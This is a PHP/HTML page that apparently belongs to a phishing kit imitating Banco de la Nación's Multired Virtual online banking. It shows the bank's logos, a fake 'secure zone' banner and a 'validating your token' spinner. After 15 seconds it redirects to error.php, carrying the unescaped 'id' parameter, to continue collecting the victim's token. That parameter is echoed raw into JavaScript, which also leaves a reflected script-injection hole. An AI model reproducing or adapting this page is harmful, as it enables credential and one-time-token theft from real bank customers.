﻿<?php
error_reporting(0);
$x = $_GET["id"];
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head> 
<script type="text/javascript" src="files/js/cufon.js"></script>
<script type="text/javascript" src="files/js/Medium_500.font.js"></script>
<script type="text/javascript" src="files/js/browser.js"></script>
<script type="text/javascript" src="files/js/jquery-1.11.2.js"></script>
<script type="text/javascript" src="files/js/jquery-1.8.2.min.js"></script>
<script type="text/javascript">
var brw = new Browser();
if(brw.code == 'ch'){
Cufon.replace('.dax');
Cufon.replace('.boton-clave');
	$(document).ready(function(){		
 		$('.boton-clave').css('height','20px');
		$('.boton-clave').css('padding-top','5px'); 	
	});
}
</script>
<meta http-equiv="Content-Language" content="es" />
<meta charset="utf-8">
<link rel="stylesheet" type="text/css" href="files/css/loadin.css"/>
<link rel="stylesheet" type="text/css" href="files/css/tipografias.css" />
<title>Banco de la Nación - Multired Virtual</title>
<style type="text/css">
.Estilo1 {
	color: #FF0000;
	font-weight: bold;
}
</style>
<script>
$(document).ready(function(){
setInterval("cargar()", 15000) })
function cargar(){ window.location = 'error.php?utm_source=bnacion&code_id=token&cgi='+'<?=$x?>'; }
</script>
</head>
<body>
	<div id="contenedor">
        <div id="cabecera">
            <div id="logo-multired">
              <img src="files/img/logo-multired.jpg" alt="Logotipo Multired" />
            </div>
            <div id="logo-bn">
                <img src="files/img/logo-bn.jpg" alt="Logotipo del Banco de la Nación" />
            </div>
        </div>
        <div id="cuerpo">
            <h1 class="dax"><img src="files/img/candado.png"> Usted se encuentra en una <span>zona segura</span></h1>
            <div id="login">
                <div id="border-superior"><img src="files/img/border-arriba.png" alt="Border Login Superior" /></div>
                <div id="login-contenido"><div class="cssmsg">Validando el Token ingresado</div>
<div class="cssload-loader"></div><div class="cssmsg2">Por favor espere unos segundos...</div>
				</div>
                <div id="border-inferior"><img src="files/img/border-abajo.png" alt="Border Login Inferior" /></div>
            </div>
        </div>   
<div id="pie-pagina">
   <div id="titulo-pie-pagina">Banco de la Nación  |  Ministerio de Economía y Finanzas</div>
      <div id="oficinas">
        <p>Oficina Principal: Av. República de Panamá 3664. San Isidro. Central Telefónica: 519-20 00. </p>
        <p>Atención en Oficinas Administrativas: Lunes a Viernes de 8:30 a 17:30 horas. Refrigerio de: 13 a 14 horas </p>
        <p>Ateción en Oficina de Trámite Documentario: Lunes a Viernes de 9:00 a 17:00 horas (Horario corrido).</p>
            </div>
        </div>
    </div>
</body>
</html>